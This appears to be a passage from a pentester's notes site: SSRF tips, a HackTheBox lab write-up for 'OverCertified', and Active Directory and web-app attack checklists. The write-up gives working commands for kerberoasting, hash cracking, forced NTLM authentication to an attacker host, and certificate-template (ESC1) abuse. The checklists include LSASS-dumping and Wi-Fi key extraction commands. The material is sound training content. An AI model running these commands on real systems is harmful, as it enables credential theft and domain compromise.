SSRF - API interactions where an entire URL is being passed via a controllable input - HTTP parameters that are being passed URLs (or sometimes files)</p> <p>Found an SSRF? - Try requesting localhost - Can you make a request to a sensitive endpoint coming from localhost? - Fuzz LAN subnets - Found alive IP on LAN?      - Fuzz for open ports</p> <p>Blind SSRF - We find an ssrf but we do not receive a response with data indicating we've hit an endpoint. - Data exfil CAN be possible, but it is pretty difficult.  - Use a tool like burp collaborator OR:     - https://github.com/projectdiscovery/interactsh-web</p> <p>Misc - Payloads delivered via http request headers may take SSRF to further compromise.     - Ex: https://infosecwriteups.com/shellshock-a-deep-dive-into-cve-2014-6271-3eb5b33e5de6 (Shell shock payload delivered via UA)</p>"},{"location":"%F0%9F%A4%93%20writeups/","title":"Index","text":"<p>Migrating writeups to new site (in progress)</p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/","title":"OverCertified","text":""},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#network-recon","title":"Network recon","text":"<pre><code>sudo nmap -T4 -A -v -o nmap --min-rate 1000 10.129.229.25 -Pn\n</code></pre> <p>Multi-protocol recon <pre><code>enum4linux-ng -A 10.129.229.25\n</code></pre> </p> <p>We have anonymous LDAP access</p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#ldap-enumeration","title":"LDAP Enumeration","text":"<p>Get users: <pre><code>ldapsearch -x -b \"DC=certified,DC=htb\" -s sub \"(&amp;(objectclass=user))\" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d \" \" &gt; users.txt\n</code></pre> Validate users: <pre><code>kerbrute userenum -d certified.htb --dc 10.129.229.25 users.txt\n</code></pre>  All users but guest are valid + all users require preauth for tickets requests.  Getting users descriptions <pre><code>nxc ldap 10.129.229.25 -u '' -p '' -M get-desc-users\n</code></pre> We get a password </p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#lateral-movement-to-mssqlserver","title":"Lateral Movement to MSSQLSERVER","text":"<p>Lets check for users with SPNs set <pre><code>ldapsearch -x -b \"DC=certified,DC=htb\" -s sub \"(&amp;(objectClass=user)(servicePrincipalName=*))\" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d \" \"\n</code></pre>  user is kerberoastable!  <pre><code>impacket-GetUserSPNs -dc-ip 10.129.229.25 certified.htb/ldapusr:'ldapisfun' -request-user MSSQLSERVER\n</code></pre>  Try to crack the hash <pre><code>hashcat -m 13100 mssqlserver.hash /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>MSSQLSERVER:lucky7\n</code></pre></p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#mssql-enumeration","title":"MSSQL Enumeration","text":"<p><pre><code>nxc mssql 10.129.229.25 -u 'MSSQLSERVER' -p 'lucky7' -q 'SELECT name FROM master.dbo.sysdatabases;'\n</code></pre> <pre><code>impacket-mssqlclient MSSQLSERVER:'lucky7'@10.129.229.25 -windows-auth\n</code></pre></p> <p>We enumerate stored procedures and tables, we find out we can't run <code>xp_cmdshell</code> to get RCE. We can run <code>xp_dirtree</code> for force auth. Start responder: <pre><code>sudo responder -I tun0\n</code></pre> Trigger auth: <pre><code>xp_dirtree \\\\10.10.14.4\\test\n</code></pre>  Lets try to crack the NTLMv2 hash <pre><code>hashcat -m 5600 thomas.hash /usr/share/wordlists/rockyou.txt\n</code></pre> <pre><code>thomas:159357\n</code></pre> we have access with winrm <pre><code>nxc winrm 10.129.229.25 -u thomas -p '159357'\n</code></pre> <pre><code>evil-winrm -i 10.129.229.25 -u thomas -p '159357'\n</code></pre> after grabbing the user flag and poking around, i decided to run bloodhound <pre><code>sudo bloodhound-ce-python -u 'thomas' -p '159357' -ns 10.129.229.25 -d certified.htb -c all\n</code></pre>  We see <code>thomas</code> has inherited access to the <code>CERTIFICATE SERVICE DCOM ACCESS</code> group. This makes me think the priv esc is an ADCS misconfiguration </p>"},{"location":"%F0%9F%A4%93%20writeups/HackTheBox/OverCertified/#administrator","title":"Administrator","text":"<p>Use certipy to find vulnerable templates <pre><code>certipy-ad find -vulnerable -u thomas -p '159357' -dc-ip 10.129.229.25\n</code></pre>  We see this template is vulnerable to ESC1  Lets collect what we need for ESC1: Template name, CA, target domain. </p> <p>we can build our pfx request targeting the administrator user <pre><code>certipy-ad req -u thomas -p '159357' -dc-ip 10.129.229.25 -template Auth -upn Administrator@certified.htb -ca CERTIFIED-CA -target certified.certified.htb\n</code></pre>  We can either use the pfx directly with nxc: <pre><code>nxc smb 10.129.229.25 --pfx-cert administrator.pfx -u 'Administrator'\n</code></pre>  OR use <code>certipy auth</code> to get a TGS and NTLM hash <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.229.25\n</code></pre>  and use that to auth.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/","title":"Active Directory","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#i-reconnaissance-enumeration-pre-compromise","title":"I. Reconnaissance &amp; Enumeration (Pre-Compromise)","text":"<ul> <li>External Reconnaissance:<ul> <li>Identify domain names and subdomains (OSINT, DNSdumpster, Sublist3r)</li> <li>Gather employee names and email addresses (OSINT, Hunter.io, theHarvester)</li> <li>Identify publicly exposed services (Nmap, Shodan)</li> <li>Search for leaked credentials (Have I Been Pwned, DeHashed)</li> </ul> </li> <li>Internal Network Mapping (Assuming Initial Access to a Network Point):<ul> <li>Identify live hosts (Nmap, Ping, ARP scans)</li> <li>Port scan identified hosts (Nmap, Masscan)</li> <li>Identify running services and versions (Nmap -sV)</li> </ul> </li> <li>LDAP Enumeration (Anonymous or Authenticated):<ul> <li>Identify Domain Controllers (nltest /dclist:, Nmap LDAP scripts, ADExplorer)</li> <li>Enumerate domain information (ldapsearch, ADExplorer, PowerView)</li> <li>Enumerate users (ldapsearch, PowerView Get-NetUser)</li> <li>Enumerate groups (ldapsearch, PowerView Get-NetGroup)</li> <li>Enumerate computers (ldapsearch, PowerView Get-NetComputer)</li> <li>Enumerate OUs (ldapsearch, ADExplorer)</li> <li>Enumerate Group Policies (PowerView Get-NetGPO)</li> <li>Enumerate ACLs on objects (PowerView Get-ObjectAcl, dsacls)</li> <li>Identify domain trusts (nltest /domain_trusts, PowerView Get-NetDomainTrust)</li> <li>Identify sites and subnets (nltest /siteget, PowerView Get-NetSite)</li> <li>Check for LDAP signing (Nmap ldap-security script, LdapRelayScan)</li> </ul> </li> <li>SMB Enumeration:<ul> <li>List shares (Nmap smb-enum-shares, CrackMapExec, smbclient)</li> <li>Check for NULL sessions (rpcclient -U \"\" -N, enum4linux)</li> <li>Enumerate users via SAMR (enum4linux, CrackMapExec --rid-brute)</li> <li>Enumerate domain policies (enum4linux)</li> </ul> </li> <li>DNS Enumeration:<ul> <li>Identify internal DNS servers</li> <li>Attempt zone transfers (dig axfr, nslookup ls -d)</li> <li>Enumerate DNS records (dnsrecon, Nmap dns-brute)</li> <li>Check for ADIDNS stale records (ADIDNSDump)</li> </ul> </li> <li>RPC/MSRPC Enumeration:<ul> <li>Enumerate RPC endpoints (rpcdump.py)</li> <li>Gather information via specific MSRPC interfaces</li> </ul> </li> <li>Kerberos Enumeration:<ul> <li>Identify KDC (Key Distribution Center)</li> <li>User enumeration via Kerberos (Kerbrute userenum, nmap script krb5-enum-users)</li> </ul> </li> <li>NTP Enumeration:<ul> <li>Identify NTP servers (ntpq -p, nmap ntp-info)</li> </ul> </li> <li>BloodHound Data Collection:<ul> <li>Run SharpHound collector (BloodHound GUI, PowerShell ingestor)</li> <li>Analyze data for attack paths (BloodHound GUI)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#ii-initial-compromise","title":"II. Initial Compromise","text":"<ul> <li>Password Spraying:<ul> <li>Target common usernames with weak/common passwords (CrackMapExec, MSF auxiliary/scanner/smb/smb_login)</li> </ul> </li> <li>AS-REP Roasting:<ul> <li>Identify users with \"Do not require Kerberos preauthentication\" set (PowerView Get-DomainUser -PreauthNotRequired, Rubeus asreproast)</li> <li>Crack AS-REP hashes (Hashcat, John the Ripper)</li> </ul> </li> <li>LLMNR/NBT-NS/mDNS Poisoning:<ul> <li>Listen for and spoof name resolution requests (Responder, Inveigh)</li> <li>Relay captured hashes (ntlmrelayx.py) or crack them (Hashcat, John the Ripper)</li> </ul> </li> <li>SMB Relay Attacks:<ul> <li>Relay SMB authentication to other machines (ntlmrelayx.py)</li> <li>Target machines with SMB signing disabled (Responder, nmap smb-security-mode)</li> </ul> </li> <li>Printer Spooler (PrintNightmare &amp; variants - CVE-2021-34527, CVE-2021-1675):<ul> <li>Check for vulnerable spooler service (Rpcclient, various exploit scripts)</li> </ul> </li> <li>PetitPotam (MS-EFSRPC):<ul> <li>Coerce machine account authentication (PetitPotam.py)</li> <li>Combine with AD CS for NTLM relay (if applicable)</li> </ul> </li> <li>Exploiting Known Vulnerabilities:<ul> <li>Scan for unpatched systems (Nessus, OpenVAS, Nmap NSE scripts)</li> <li>Target specific CVEs (e.g., Zerologon - CVE-2020-1472, MS17-010 EternalBlue)</li> </ul> </li> <li>Phishing/Spear Phishing:<ul> <li>Deliver malicious payloads (executables, documents with macros, links)</li> </ul> </li> <li>Web Application Vulnerabilities (on domain-joined servers):<ul> <li>Test for common web vulns (SQLi, XSS, RCE)</li> </ul> </li> <li>Default/Weak Credentials in Services:<ul> <li>Check common services (Tomcat, JBoss, Jenkins, etc.)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#iii-credential-dumping-hash-cracking","title":"III. Credential Dumping &amp; Hash Cracking","text":"<ul> <li>LSASS Dumping:<ul> <li>Mimikatz (sekurlsa::logonpasswords, sekurlsa::msv, sekurlsa::tspkg, sekurlsa::wdigest)</li> <li>ProcDump (procdump -ma lsass.exe lsass.dmp)</li> <li>Task Manager (right-click lsass.exe -&gt; Create dump file)</li> <li>comsvcs.dll MiniDump (rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump &lt;LSASS_PID&gt; C:\\temp\\lsass.dmp full)</li> </ul> </li> <li>SAM/SYSTEM Hive Extraction (Offline):<ul> <li>Extract from Volume Shadow Copies</li> <li>Extract from backups</li> <li>Use tools like secretsdump.py, pwdump</li> </ul> </li> <li>NTDS.dit Extraction (Domain Controller):<ul> <li>Use ntdsutil.exe (ifm - create full)</li> <li>Volume Shadow Copy methods (vssadmin, diskshadow)</li> <li>secretsdump.py (remote extraction)</li> <li>Parse with tools like Impacket's secretsdump.py, Quarks PwDump</li> </ul> </li> <li>LSA Secrets:<ul> <li>Mimikatz (lsadump::secrets)</li> <li>secretsdump.py</li> </ul> </li> <li>DPAPI (Data Protection API):<ul> <li>Extract DPAPI master keys (Mimikatz dpapi::masterkey)</li> <li>Decrypt DPAPI protected secrets (SharpDPAPI, DonPAPI)</li> </ul> </li> <li>Browser Passwords/Cookies:<ul> <li>LaZagne, SharpWeb, BrowseHistoryView</li> </ul> </li> <li>Credentials in Files/Registry:<ul> <li>GPP Passwords (SYSVOL group.xml files - PowerSploit Get-GPPPassword, SharpGPOAbuse)</li> <li>Unattend.xml files</li> <li>Web.config files</li> <li>PowerShell transcripts</li> <li>Registry (e.g., WinSCP, VNC passwords)</li> </ul> </li> <li>Wireless Network Keys:<ul> <li><code>netsh wlan show profiles key=clear</code></li> </ul> </li> <li>Hash Cracking:<ul> <li>Tools: Hashcat, John the Ripper</li> <li>Target: NTLM, NTLMv2, Kerberos tickets, LM</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#iv-local-privilege-escalation-windows","title":"IV. Local Privilege Escalation (Windows)","text":"<ul> <li>Kernel Exploits:<ul> <li>Check OS version and patch level (systeminfo)</li> <li>Search for known exploits (Sherlock, Watson, Windows Exploit Suggester)</li> </ul> </li> <li>Insecure Service Permissions:<ul> <li>Writable service binaries (accesschk.exe, PowerUp Get-ModifiableServiceFile)</li> <li>Modifiable service configuration (accesschk.exe, PowerUp Get-ModifiableService)</li> <li>Unquoted Service Paths (PowerUp Get-UnquotedService, <code>wmic service get name,pathname,startname | findstr /i \"program files\" | findstr /i /v \"\"\"</code>)</li> </ul> </li> <li>DLL Hijacking:<ul> <li>Identify missing DLLs loaded by privileged processes (ProcMon)</li> <li>Check for writable directories in PATH</li> </ul> </li> <li>AlwaysInstallElevated:<ul> <li>Check registry keys: <code>HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code> and <code>HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code> (reg query)</li> </ul> </li> <li>Scheduled Tasks:<ul> <li>Writable task files/actions (accesschk.exe, schtasks /query /v /fo LIST)</li> <li>Tasks running as SYSTEM with modifiable binaries</li> </ul> </li> <li>Startup Applications:<ul> <li>Writable startup application paths/binaries (accesschk.exe)</li> </ul> </li> <li>Registry Misconfigurations:<ul> <li>Autoruns keys (HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, etc.) - check permissions (accesschk.exe)</li> <li>Weak permissions on <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code> keys</li> </ul> </li> <li>Credential Manager / Stored Credentials:<ul> <li>cmdkey /list</li> <li>Mimikatz (vault::cred, token::elevate then vault::cred)</li> </ul> </li> <li>Token Impersonation/Theft:<ul> <li>Incognito (MSF Meterpreter), Mimikatz (token::*)</li> <li>Identify privileged tokens (Get-Process -IncludeUserName | Select-Object -ExpandProperty UserName)</li> </ul> </li> <li>Potato Attacks (SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege):<ul> <li>RottenPotato, JuicyPotato, SweetPotato, GenericPotato (check for required privileges: <code>whoami /priv</code>)</li> </ul> </li> <li>Password Mining from Memory/Files (already covered in Credential Dumping):<ul> <li>Look for passwords in configuration files, scripts, memory dumps</li> </ul> </li> <li>Group Policy Preferences (GPP) Passwords (local):<ul> <li>If GPP files were cached locally with cpassword</li> </ul> </li> <li>Named Pipe Impersonation:<ul> <li>Exploit vulnerable named pipe servers</li> </ul> </li> <li>Abusing Privileges:<ul> <li>SeBackupPrivilege (robocopy /B, diskshadow, SharpBackup)</li> <li>SeRestorePrivilege</li> <li>SeTakeOwnershipPrivilege (takeown.exe)</li> <li>SeDebugPrivilege (already heavily used by tools like Mimikatz)</li> <li>SeLoadDriverPrivilege (Capcom.sys exploit, KDU)</li> <li>SeCreateTokenPrivilege</li> <li>SeTcbPrivilege</li> </ul> </li> <li>Hot Potato/Rotten Potato NG/PrintSpoofer:<ul> <li>When specific privileges (SeImpersonate, SeAssignPrimaryToken) are available.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#v-lateral-movement","title":"V. Lateral Movement","text":"<ul> <li>Pass-the-Hash (PtH):<ul> <li>Use NTLM hashes to authenticate (Mimikatz sekurlsa::pth, CrackMapExec, Impacket's psexec.py/smbexec.py/wmiexec.py with -hashes)</li> </ul> </li> <li>Pass-the-Ticket (PtT):<ul> <li>Use Kerberos tickets (TGTs, TGSs) to authenticate (Mimikatz kerberos::ptt, Rubeus ptt)</li> <li>Requires LSASS access or exported tickets</li> </ul> </li> <li>Over-Pass-the-Hash (OPtH) / Pass-the-Key:<ul> <li>Use AES keys (from Kerberos) instead of NTLM hashes (Mimikatz sekurlsa::pth /kdc, Rubeus asktgs /aeskey)</li> </ul> </li> <li>SMB/PsExec:<ul> <li>Execute commands remotely (psexec.exe, CrackMapExec, Impacket's psexec.py, smbexec.py)</li> </ul> </li> <li>Windows Management Instrumentation (WMI):<ul> <li>Execute commands remotely (wmic.exe, CrackMapExec, Impacket's wmiexec.py, PowerSploit Invoke-WmiCommand)</li> </ul> </li> <li>WinRM / PowerShell Remoting:<ul> <li>Execute PowerShell commands remotely (Enter-PSSession, Invoke-Command)</li> <li>Check if WinRM is enabled (Test-WSMan)</li> </ul> </li> <li>Remote Desktop Protocol (RDP):<ul> <li>Connect with valid credentials (mstsc.exe, rdesktop, xfreerdp)</li> <li>RDP session hijacking (tscon)</li> </ul> </li> <li>Scheduled Tasks (Remote):<ul> <li>Create/modify tasks on remote systems (schtasks /s &lt;target&gt; /create, Invoke-ATHRemote)</li> </ul> </li> <li>DCOM Objects:<ul> <li>Utilize DCOM applications for remote execution (e.g., MMC20.Application, ShellBrowserWindow)</li> </ul> </li> <li>Exploiting Trust Relationships:<ul> <li>Move between domains/forests via trust keys (inter-realm TGT, Mimikatz lsadump::trust /patch)</li> </ul> </li> <li>Resource-Based Constrained Delegation (RBCD):<ul> <li>If you compromise an account/computer that has <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on a target computer.</li> <li>Forge S4U2self/S4U2proxy tickets (Rubeus s4u)</li> </ul> </li> <li>Distributed File System (DFS):<ul> <li>Identify DFS shares and target linked servers.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#vi-domain-dominance-persistence","title":"VI. Domain Dominance &amp; Persistence","text":"<ul> <li>Golden Ticket Attack:<ul> <li>Forge a Kerberos TGT for any user with any privileges (Mimikatz kerberos::golden)</li> <li>Requires krbtgt account NTLM hash/AES key</li> </ul> </li> <li>Silver Ticket Attack:<ul> <li>Forge a Kerberos TGS for a specific service on a specific server (Mimikatz kerberos::golden /service /server /user /id (SPN's RID))</li> <li>Requires service account NTLM hash/AES key (e.g., CIFS, HOST, RPCSS)</li> </ul> </li> <li>Skeleton Key:<ul> <li>Patch LSASS on DCs to allow a master password for all users (Mimikatz misc::skeleton)</li> <li>Requires DA privileges and LSASS access on DC</li> </ul> </li> <li>DSRM (Directory Services Restore Mode) Password Synchronization:<ul> <li>Synchronize DSRM password with a domain admin account for backdoor access (Mimikatz lsadump::setntlm)</li> </ul> </li> <li>AdminSDHolder:<ul> <li>Modify AdminSDHolder object permissions to grant persistence to protected groups (PowerView Set-ObjectACL)</li> </ul> </li> <li>Domain Controller Synchronization Rights (DCsync):<ul> <li>Grant an account the rights to replicate directory changes (Mimikatz lsadump::dcsync)</li> <li>Requires \"Replicating Directory Changes\" and \"Replicating Directory Changes All\" permissions</li> </ul> </li> <li>SID History:<ul> <li>Add a known SID (e.g., Domain Admins SID) to an account's SID history (Mimikatz sid::patch)</li> </ul> </li> <li>Group Policy Abuse:<ul> <li>Modify GPOs to deploy software, run scripts, change local admin groups (Group Policy Management Console, SharpGPOAbuse)</li> </ul> </li> <li>Scheduled Tasks on DCs:<ul> <li>Create persistent tasks on Domain Controllers</li> </ul> </li> <li>Service Creation on DCs:<ul> <li>Create persistent services on Domain Controllers (sc.exe create)</li> </ul> </li> <li>Active Directory Certificate Services (AD CS) Abuse:<ul> <li>ESC1-ESC8 vulnerabilities (Certify, Certipy)</li> <li>Forge certificates for authentication (Rubeus ask /certificate)</li> </ul> </li> <li>Shadow Credentials (msDS-KeyCredentialLink):<ul> <li>Add a key credential to a target object (e.g., computer account) to authenticate as it (Whisker, NTLMRelayToADCS + ShadowCoerce)</li> </ul> </li> <li>DPAPI Domain Backup Keys:<ul> <li>Extract DPAPI domain backup keys from a DC to decrypt user DPAPI blobs (Mimikatz lsadump::backupkeys)</li> </ul> </li> <li>Modifying SACLs/ACLs:<ul> <li>Modify System Access Control Lists or ACLs on critical objects for stealth or re-entry.</li> </ul> </li> <li>DNS Admin Privileges:<ul> <li>If a user is part of DnsAdmins group, can load arbitrary DLL into DNS service running as SYSTEM (dnscmd.exe /config /serverlevelplugindll)</li> </ul> </li> <li>Backdooring LAPS:<ul> <li>If LAPS is used, gain permissions to read LAPS passwords.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#vii-specific-kerberos-attacks","title":"VII. Specific Kerberos Attacks","text":"<ul> <li>Kerberoasting:<ul> <li>Request TGS for service accounts (GetUserSPNs.py, PowerView Get-NetUser -SPN | Get-KerberoastableUser, Rubeus kerberoast)</li> <li>Crack service account hashes offline (Hashcat, John the Ripper)</li> </ul> </li> <li>AS-REP Roasting (already listed):<ul> <li>Target users without Kerberos pre-authentication</li> </ul> </li> <li>Unconstrained Delegation:<ul> <li>Identify hosts with unconstrained delegation (PowerView Get-NetComputer -Unconstrained, BloodHound)</li> <li>Coerce authentication to these hosts (PrinterBug, PetitPotam) to capture TGTs of users authenticating to them (Mimikatz on the unconstrained host)</li> </ul> </li> <li>Constrained Delegation (Traditional &amp; RBCD):<ul> <li>Identify accounts/computers configured for constrained delegation (PowerView, BloodHound)</li> <li>If S4U2Self is enabled, can impersonate users to services the account is delegated to (Rubeus s4u)</li> <li>For RBCD, see Lateral Movement section.</li> </ul> </li> <li>\"NoPAC\" / SAM Account Name Spoofing (CVE-2021-42278 &amp; CVE-2021-42287):<ul> <li>Combine machine account rename with KDC SPN processing flaw for privilege escalation (exploit scripts available)</li> </ul> </li> <li>Diamond Ticket (Modifying TGT):<ul> <li>Modify an existing TGT (e.g., change user ID, groups) if krbtgt key is known (requires specialized tools beyond standard Mimikatz golden ticket command, conceptually related).</li> </ul> </li> <li>Sapphire Ticket (Pass-the-Cache with PAC modification):<ul> <li>Injecting a PAC from one user into another's TGT/TGS.</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Active%20Directory/#viii-forest-trust-attacks","title":"VIII. Forest &amp; Trust Attacks","text":"<ul> <li>Trust Ticket Abuse:<ul> <li>Forge inter-realm TGTs if trust keys are compromised (Mimikatz lsadump::trust /patch, then kerberos::golden for cross-trust)</li> </ul> </li> <li>SID History on Trust Accounts:<ul> <li>Exploit SID history on forest trust accounts.</li> </ul> </li> <li>Exploiting Weak Trust Configurations:<ul> <li>Identify trusts with weak security settings (e.g., SID filtering disabled).</li> </ul> </li> <li>Abusing <code>**krbtgt**</code> account synchronization across trusts.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/","title":"Web Application","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#i-planning-reconnaissance-information-gathering-pre-engagement-pre-exploitation","title":"I. Planning, Reconnaissance &amp; Information Gathering (Pre-Engagement &amp; Pre-Exploitation)","text":"<ul> <li>A. Scoping &amp; Rules of Engagement<ul> <li>Define Target URLs/Applications/APIs</li> <li>Define Testing Scope (e.g., specific functionalities, subdomains, out-of-scope areas)</li> <li>Define Objectives (e.g., identify OWASP Top 10, specific data exfiltration, RCE)</li> <li>Define Allowed/Disallowed Test Types (e.g., DoS/DDoS, aggressive scanning, social engineering of app users)</li> <li>Define Testing Window &amp; Blackout Periods</li> <li>Establish Communication Channels &amp; Escalation Paths</li> <li>Obtain Explicit Written Authorization</li> <li>Identify Test Accounts (roles: unauthenticated, authenticated user, admin, etc.)</li> <li>Discuss Incident Response Plan (client-side) if critical issues are found</li> <li>NDA and Legal Agreements in Place</li> <li>Understand Business Logic and Critical Workflows</li> </ul> </li> <li>B. Passive Reconnaissance (OSINT &amp; Non-Intrusive)<ul> <li>Identify Hosting Provider &amp; IP Addresses</li> <li>Gather DNS Information (A, CNAME, MX, TXT, SPF, DMARC, DKIM)</li> <li>Subdomain Enumeration (Search engines, DNSDumpster, VirusTotal, Sublist3r, Amass,crt.sh)</li> <li>Identify Related Domains &amp; Acquired Company Applications</li> <li>Search Engine Dorking (Google, Bing, DuckDuckGo) for:<ul> <li>Login Pages</li> <li>Admin Portals</li> <li>Error Messages</li> <li>Exposed Files (config, logs, backups, documents)</li> <li>Sensitive Information in Public Documents/Metadata</li> <li>API Endpoints in JavaScript files</li> </ul> </li> <li>Analyze Publicly Available Code Repositories (GitHub, GitLab, Bitbucket) for:<ul> <li>Hardcoded Credentials</li> <li>API Keys</li> <li>Sensitive Logic/Endpoints</li> <li>Vulnerable Code Snippets</li> </ul> </li> <li>Check Web Archive (Archive.org, other caches) for:<ul> <li>Old Versions of Pages</li> <li>Previously Exposed Information or Endpoints</li> <li>Changes in Technology Stack</li> </ul> </li> <li>Analyze SSL/TLS Certificates (Subject Alternative Names, Issuer, Validity, Certificate Transparency Logs)</li> <li>Identify Technologies Used (Wappalyzer, WhatWeb, BuiltWith):<ul> <li>Web Server (Apache, Nginx, IIS, etc.)</li> <li>Backend Language/Framework (PHP, Java/Spring, Python/Django, Node.js/Express, Ruby/Rails, ASP.NET)</li> <li>Frontend Frameworks/Libraries (React, Angular, Vue.js, jQuery)</li> <li>Content Management System (CMS) (WordPress, Joomla, Drupal, etc.) &amp; Plugins/Themes</li> <li>Web Application Firewall (WAF) Detection (WAFW00F)</li> <li>Analytics &amp; Marketing Tools</li> </ul> </li> <li>Search for Publicly Reported Vulnerabilities for Identified Technologies</li> <li>Analyze <code>robots.txt</code> and <code>sitemap.xml</code></li> <li>Check for Information Disclosure in HTTP Headers</li> <li>Social Media &amp; Forum Research for Employee Posts or Application Mentions</li> <li>Pastebin/Dark Web searches for leaked credentials or data related to the target</li> </ul> </li> <li>C. Active Reconnaissance (Light Interaction)<ul> <li>Manual Site Crawling &amp; Exploration (as a user)</li> <li>Identify Application Entry Points (Login, Registration, Search, Contact Forms, File Uploads)</li> <li>Identify Application Exit Points (Data Display, Exports, API Responses)</li> <li>Automated Spidering/Crawling (Burp Suite, ZAP, Screaming Frog - respect <code>robots.txt</code> unless permitted to ignore)</li> <li>Directory &amp; File Brute-Forcing (Gobuster, Dirb, Feroxbuster, ffuf) for:<ul> <li>Admin Interfaces</li> <li>Backup Files (<code>.bak</code>, <code>.old</code>, <code>.zip</code>, <code>~</code>)</li> <li>Configuration Files (<code>web.config</code>, <code>.env</code>, <code>wp-config.php</code>)</li> <li>Source Code Files (<code>.java</code>, <code>.php</code>, <code>.cs</code>, <code>.py</code>)</li> <li>Log Files</li> <li>Temporary Files</li> <li>Exposed API Endpoints (common paths, Swagger/OpenAPI definitions)</li> </ul> </li> <li>Virtual Host Enumeration (if multiple apps on same IP)</li> <li>Fingerprint Web Server Further (HTTP methods, error pages, specific version probes)</li> <li>Light Port Scanning on Web Server IP (common web ports: 80, 443, 8000, 8080, etc.)</li> <li>Identify Default Credentials for Known Technologies (e.g., Tomcat Manager, JBoss Console)</li> <li>Analyze JavaScript Files for:<ul> <li>API Endpoints</li> <li>Hidden Parameters</li> <li>Sensitive Logic</li> <li>Comments with sensitive info</li> <li>Weak Cryptographic Usage</li> <li>DOM XSS Sinks &amp; Sources</li> </ul> </li> <li>Check for Source Code Disclosure (e.g., <code>.git</code> folder, <code>.DS_Store</code>, SVN entries)</li> <li>Check for Client-Side Storage (Local Storage, Session Storage, Cookies, IndexedDB) for sensitive data</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#ii-threat-modeling-vulnerability-analysis","title":"II. Threat Modeling &amp; Vulnerability Analysis","text":"<ul> <li>A. Identify Key Assets &amp; Trust Boundaries:<ul> <li>User Data (PII, credentials, financial info)</li> <li>Application Data (business secrets, intellectual property)</li> <li>Session Tokens</li> <li>Admin Functionality</li> <li>Backend Systems (databases, internal APIs)</li> </ul> </li> <li>B. Analyze Application Architecture:<ul> <li>Client-Side vs. Server-Side Logic</li> <li>Single Page Application (SPA) vs. Traditional Multi-Page Application (MPA)</li> <li>API Usage (internal, external, third-party)</li> <li>Data Flow Diagrams (how data is processed, stored, transmitted)</li> <li>Authentication &amp; Authorization Mechanisms</li> </ul> </li> <li>C. Map Attack Surface:<ul> <li>All HTTP(S) Endpoints (GET, POST, PUT, DELETE, etc.)</li> <li>All Input Parameters (URL, query string, headers, body - JSON, XML, form-data)</li> <li>File Upload Functionality</li> <li>User-Controllable Data in Headers (Referer, User-Agent, Custom Headers)</li> <li>WebSockets / Server-Sent Events</li> <li>Third-Party Integrations &amp; Libraries</li> </ul> </li> <li>D. Automated Vulnerability Scanning (with caution and verification):<ul> <li>Dynamic Application Security Testing (DAST) tools (Burp Suite Pro, OWASP ZAP, Acunetix, Netsparker)</li> <li>Content Management System (CMS) specific scanners (WPScan, JoomScan, Droopescan)</li> <li>API specific scanners</li> <li>JavaScript library vulnerability scanners (Retire.js)</li> <li>Review and Manually Verify All Scanner Findings (critical to eliminate false positives)</li> </ul> </li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%E2%9C%85%20Checklists/Web%20Application/#iii-authentication-testing","title":"III. Authentication Testing","text":"<ul> <li>A. Enumeration:<ul> <li>User Enumeration via Login Page (different error messages for valid/invalid users)</li> <li>User Enumeration via Password Reset Page</li> <li>User Enumeration via Registration Page (username already exists)</li> <li>User Enumeration via API endpoints</li> </ul> </li> <li>B. Password Policy:<ul> <li>Check for Minimum/Maximum Length Requirements</li> <li>Check for Complexity Requirements (uppercase, lowercase, numbers, symbols)</li> <li>Check for Password History Restriction</li> <li>Check for Password Expiration &amp; Forced Reset</li> <li>Check against Common Password Lists / Dictionary Attacks</li> <li>Check for Easily Guessable \"Hint\" Questions/Answers</li> </ul> </li> <li>C. Brute-Force Attacks:<ul> <li>Login Form Brute-Force (users, passwords)</li> <li>Password Reset Token Brute-Force</li> <li>CAPTCHA Bypass/Weakness Testing</li> <li>Account Lockout Mechanism Testing (existence, threshold, duration, reset)</li> <li>Rate Limiting on Authentication Attempts</li> <li>Multi-Factor Authentication (MFA/2FA) Token Brute-Force (if applicable)</li> </ul> </li> <li>D. Credentials Transport &amp; Storage:<ul> <li>Credentials Sent Over HTTPS (no HTTP)</li> <li>Autocomplete Prevention on Password 